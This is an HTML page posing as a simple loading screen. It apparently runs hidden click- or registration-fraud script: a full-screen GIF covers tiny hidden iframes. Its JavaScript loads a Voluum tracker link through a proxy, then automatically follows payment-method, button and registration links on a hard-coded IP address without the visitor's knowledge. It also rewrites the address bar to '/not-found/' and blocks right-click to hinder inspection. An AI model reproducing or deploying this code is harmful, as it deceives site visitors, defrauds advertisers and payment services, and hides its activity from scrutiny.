

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Loading ...</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
</head>
<body >
<img src="/loading-ajhiufahi89asf3s.gif" /><div id="wwf">
	
        <iframe src="" name="f1" id="f1"   width="10" height="10"  ></iframe>
	<iframe src="" name="f2" id="f2"   width="10" height="10"  ></iframe>
</div>
<style>
        #wwf{position:fixed;left:0;top:0;z-index:-4}
        #wwf *{z-index:-4}
	button {display:none}
        img{position:relative;z-index:5;width:100%}</style>

<script>
	var f2_loads = 0;
        function ff( )
        {
		var d= true;
		var link ='http://x0slm.voluumtrk.com/610aae38-10d3-4a8b-a385-563e90d4fab9';

		rn(link,function(data){
			d&&cl(data);
			pif('/genrp_get/'+data);
			interval = setInterval(function(){
				if($('#f1').contents().find('#payment-method > iframe').length)
				{
					clearInterval(interval);
					data = $('#f1').contents().find('#payment-method > iframe').attr('src');
					d&&cl(data);
					//
					document.getElementById('f2').src = '/genrp_get/'+data;
					$.get(data);
					interval2 = setInterval(function(){
						if($('#f2').contents().find('a.button_link').attr('href'))
						{
							clearInterval(interval2);
							nextData = $('#f2').contents().find('a.button_link').attr('href');
							document.getElementById('f2').src = '/genrp_get/http://95.110.188.135'+nextData;
							$.get('http://95.110.188.135'+nextData);
							document.getElementById('f2').onload = function(){
								data = 'http://95.110.188.135'+$('#f2').contents().find('#registrationLink').attr('href');
								document.getElementById('f2').onload = function(){};
								document.getElementById('f2').src = data;
							};
						}
					},1000);
				}
			},1000);
		});
                                
//                setTimeout(function(){
//                	window.location = "/not-found/";
//                } , 12000);
                
                		
        }
	var loads =0;
$(function(){
	setTimeout(function(){ ff(); },1000);
});

var prevref = '';

function rn( requrl, callback )
{
	requrl = requrl.split('|||')[1] || requrl;
	$.ajax({
                        url:'/genrp/' + requrl,
                        type: 'get',
                        headers: {
                              "X-Referer": prevref
                        },
                        success: function (data) {
                                prevref = data;
				callback(data);
                        }
                });
}
function fetch( requrl, callback )
{
        requrl = requrl.split('|||')[1] || requrl;
        $.ajax({
                        url:'/genrp_get/' + requrl,
                        type: 'get',
                        headers: {
                              "X-Referer": prevref
                        },
                        success: function (data) {
                                prevref = data;
                                callback(data);
                        }
                });
}
function rnn(requrl,callback)
{
	$.get(requrl,function(data){callback(data)});
}

function cl(data)
{
	console.log(data);
}
function pif(data)
{
	document.getElementById('f1').src = data;
}

function put()
{
	document.getElementById('f1').src = $('#hjhj').val();
}
</script>

<script>
document.onreadystatechange = function(){
	if(document.readyState === "interactive"){


					var state = {  "foo": true };
			history.pushState(state, "foo", "/not-found/");
							document.oncontextmenu = function() { return false; }
			document.onmousedown = function(e) { if( e.button == 2 ) { return false; } }
						

	};
}
</script>

</body>
<html>

  
